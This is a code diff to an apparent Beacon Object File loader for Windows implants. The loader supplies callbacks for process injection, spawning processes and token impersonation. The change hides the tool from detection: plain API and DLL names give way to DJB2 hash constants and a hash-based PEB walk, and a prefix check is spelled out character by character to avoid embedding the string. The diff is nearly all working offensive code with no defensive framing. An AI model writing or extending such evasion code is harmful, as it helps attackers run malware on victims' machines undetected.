@@ -7,6 +7,7 @@
  */
 #include "bof.h"
 #include <windows.h>
+#include "api_resolve.h"
 #include <stdint.h>
 #include <stddef.h>
 #include <stdlib.h>
@@ -290,40 +291,42 @@ static BOOL __cdecl cb_BeaconRevertToken(void)  { return RevertToSelf(); }
 static BOOL __cdecl cb_BeaconUseToken(HANDLE h) { return ImpersonateLoggedOnUser(h); }
 static void __cdecl cb_BeaconSetSleep(int ms, int jitter) { (void)ms; (void)jitter; }
 
-/* ── Beacon API name → function pointer table ───────────────────────────── */
-typedef struct { const char *name; void *fn; } BeaconApiEntry;
-static const BeaconApiEntry g_beacon_api[] = {
-    { "BeaconDataParse",              (void *)cb_BeaconDataParse },
-    { "BeaconDataInt",                (void *)cb_BeaconDataInt },
-    { "BeaconDataShort",              (void *)cb_BeaconDataShort },
-    { "BeaconDataLength",             (void *)cb_BeaconDataLength },
-    { "BeaconDataExtract",            (void *)cb_BeaconDataExtract },
-    { "BeaconOutput",                 (void *)cb_BeaconOutput },
-    { "BeaconPrintf",                 (void *)cb_BeaconPrintf },
-    { "BeaconFormatAlloc",            (void *)cb_BeaconFormatAlloc },
-    { "BeaconFormatReset",            (void *)cb_BeaconFormatReset },
-    { "BeaconFormatFree",             (void *)cb_BeaconFormatFree },
-    { "BeaconFormatAppend",           (void *)cb_BeaconFormatAppend },
-    { "BeaconFormatPrintf",           (void *)cb_BeaconFormatPrintf },
-    { "BeaconFormatToString",         (void *)cb_BeaconFormatToStr },
-    { "BeaconFormatInt",              (void *)cb_BeaconFormatInt },
-    { "BeaconIsAdmin",                (void *)cb_BeaconIsAdmin },
-    { "BeaconGetSpawnTo",             (void *)cb_BeaconGetSpawnTo },
-    { "toWideChar",                   (void *)cb_toWideChar },
-    { "BeaconInjectProcess",          (void *)cb_BeaconInjectProcess },
-    { "BeaconInjectTemporaryProcess", (void *)cb_BeaconInjectTemporaryProcess },
-    { "BeaconCleanupProcess",         (void *)cb_BeaconCleanupProcess },
-    { "BeaconSpawnTemporaryProcess",  (void *)cb_BeaconSpawnTemporaryProcess },
-    { "BeaconRevertToken",            (void *)cb_BeaconRevertToken },
-    { "BeaconUseToken",               (void *)cb_BeaconUseToken },
-    { "BeaconSetSleep",               (void *)cb_BeaconSetSleep },
-    { NULL, NULL }
+/* ── BOF callback API — hash table (DJB2 of function name, no strings) ──── */
+typedef struct { uint32_t h; void *fn; } BofApiEntry;
+static const BofApiEntry g_bof_api[] = {
+    { 0x6AB4F0E4u, (void *)cb_BeaconDataParse },
+    { 0x0D4393E2u, (void *)cb_BeaconDataInt },
+    { 0x6AA76263u, (void *)cb_BeaconDataShort },
+    { 0x025056EDu, (void *)cb_BeaconDataLength },
+    { 0x222914DCu, (void *)cb_BeaconDataExtract },
+    { 0x4862655Eu, (void *)cb_BeaconOutput },
+    { 0x51E86B76u, (void *)cb_BeaconPrintf },
+    { 0xA0F210CFu, (void *)cb_BeaconFormatAlloc },
+    { 0xA1B55237u, (void *)cb_BeaconFormatReset },
+    { 0xF55C31F6u, (void *)cb_BeaconFormatFree },
+    { 0xBF7A316Cu, (void *)cb_BeaconFormatAppend },
+    { 0xE45DFB35u, (void *)cb_BeaconFormatPrintf },
+    { 0xEF693D8Cu, (void *)cb_BeaconFormatToStr },
+    { 0x5502EE31u, (void *)cb_BeaconFormatInt },
+    { 0xB4D2F8B4u, (void *)cb_BeaconIsAdmin },
+    { 0x1A46AB57u, (void *)cb_BeaconGetSpawnTo },
+    { 0x5C5E4379u, (void *)cb_toWideChar },
+    { 0x681A2615u, (void *)cb_BeaconInjectProcess },
+    { 0x8F9FB24Eu, (void *)cb_BeaconInjectTemporaryProcess },
+    { 0x9909426Au, (void *)cb_BeaconCleanupProcess },
+    { 0x3A9E0DAAu, (void *)cb_BeaconSpawnTemporaryProcess },
+    { 0x4BE276B8u, (void *)cb_BeaconRevertToken },
+    { 0x0338FF39u, (void *)cb_BeaconUseToken },
+    { 0x1EB39E2Cu, (void *)cb_BeaconSetSleep },
+    { 0u, NULL }
 };
 
 static void *beacon_api_lookup(const char *name) {
-    for (int i = 0; g_beacon_api[i].name; i++)
-        if (strcmp(g_beacon_api[i].name, name) == 0)
-            return g_beacon_api[i].fn;
+    uint32_t h = 5381u;
+    for (const char *p = name; *p; p++)
+        h = ((h << 5) + h) ^ (uint32_t)(unsigned char)*p;
+    for (int i = 0; g_bof_api[i].fn; i++)
+        if (g_bof_api[i].h == h) return g_bof_api[i].fn;
     return NULL;
 }
 
@@ -338,7 +341,8 @@ static void *beacon_api_lookup(const char *name) {
  * function pointer (the BOF's ADDR64 relocation writes the slot address into
  * the import cell, and the BOF dereferences it at call time).               */
 static void *resolve_external(const char *name) {
-    if (strncmp(name, "__imp_", 6) != 0) return NULL;
+    /* check for __imp_ prefix without embedding the literal string */
+    if (name[0]!='_'||name[1]!='_'||name[2]!='i'||name[3]!='m'||name[4]!='p'||name[5]!='_') return NULL;
     const char *imp_name = name + 6;
 
     void *fn = NULL;
@@ -356,17 +360,14 @@ static void *resolve_external(const char *name) {
         HMODULE hm = LoadLibraryA(dll_name);
         if (hm) fn = (void *)GetProcAddress(hm, dollar + 1);
     } else {
-        /* Beacon API first, then common system DLLs */
+        /* Beacon API first, then hash-based PEB walk — no DLL name strings */
         fn = beacon_api_lookup(imp_name);
         if (!fn) {
-            static const char *common_dlls[] = {
-                "ntdll.dll", "kernel32.dll", "user32.dll", NULL
-            };
-            for (int i = 0; common_dlls[i] && !fn; i++) {
-                HMODULE hm = GetModuleHandleA(common_dlls[i]);
-                if (!hm) hm = LoadLibraryA(common_dlls[i]);
-                if (hm) fn = (void *)GetProcAddress(hm, imp_name);
-            }
+            /* Compute DJB2 hash of imp_name and search all loaded modules */
+            uint32_t h = 5381u;
+            for (const char *p = imp_name; *p; p++)
+                h = ((h << 5) + h) ^ (uint32_t)(unsigned char)*p;
+            fn = resolve_fn(h);
         }
     }
 
